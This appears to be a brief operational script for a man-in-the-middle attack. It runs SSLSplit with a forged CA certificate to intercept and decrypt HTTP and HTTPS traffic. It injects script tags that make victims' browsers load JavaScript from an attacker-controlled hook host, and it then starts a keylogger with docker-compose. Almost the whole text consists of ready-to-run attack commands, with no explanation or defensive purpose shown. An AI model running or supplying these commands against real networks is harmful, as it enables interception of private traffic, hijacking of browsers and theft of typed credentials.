# SSLSplit setup
export CERTIFICATE=ca.crt      
export PRIVATE_KEY=ca.key      
export HOOK_HOST=192.168.10.216
export HOOK_PORT_HTTP=80
export HOOK_PORT_HTTPS=443
sudo ./sslsplit -D -k "$PRIVATE_KEY" -c "$CERTIFICATE" -K "$PRIVATE_KEY" -I "<script src='http://$HOOK_HOST:$HOOK_PORT_HTTP/hook' type='text/javascript'></script>" -I  "<script src='https://$HOOK_HOST:$HOOK_PORT_HTTPS/hook' type='text/javascript'></script>" https 0.0.0.0 8443 http 0.0.0.0 8080

# Keylogger setup:
# configure --hook_host in docker-compose.yml
docker-compose up
